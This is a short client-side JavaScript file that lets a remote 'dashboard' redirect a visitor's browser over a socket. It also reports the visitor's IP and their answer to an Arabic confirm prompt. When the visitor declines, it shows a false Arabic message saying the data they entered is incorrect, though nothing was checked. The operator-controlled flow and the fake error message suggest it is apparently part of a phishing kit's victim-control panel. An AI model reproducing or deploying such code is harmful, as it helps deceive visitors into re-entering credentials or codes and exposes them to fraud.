// assets/js/location.js
(function () {
  // Grab the socket you already created in-page
  const socket = window.socket;
  if (!socket) {
    console.error("location.js: window.socket is undefined!");
    return;
  }

  // 1) When the dashboard asks you to navigate *immediately*:
  socket.on("navigateTo", ({ page }) => {
    window.location.href = page;
  });

  // 2) When the dashboard wants a confirm + approval flow:
  socket.on("requestNavigate", ({ page, requestId }) => {
    const approved = confirm(`هل تريد الانتقال إلى ${page}؟`);
    socket.emit("navigateDecision", {
      ip: window.visitorIP,
      requestId,
      approved,
    });
    window.location.href = approved ? page : page + "?declined=true";
  });

  // 3) If you arrived with ?declined=true, show the inline message once
  window.addEventListener("DOMContentLoaded", () => {
    const params = new URLSearchParams(window.location.search);
    if (params.get("declined") === "true") {
      const span = document.getElementById("decline-message");
      if (span) {
        span.textContent =
          "البيانات المُدخلة غير صحيحة، يرجى المحاولة مرة أخرى.";
        span.style.display = ""; // make sure it’s visible
      }
      // remove the query so it doesn’t reappear on reload
      history.replaceState(null, "", window.location.pathname);
    }
  });
})();
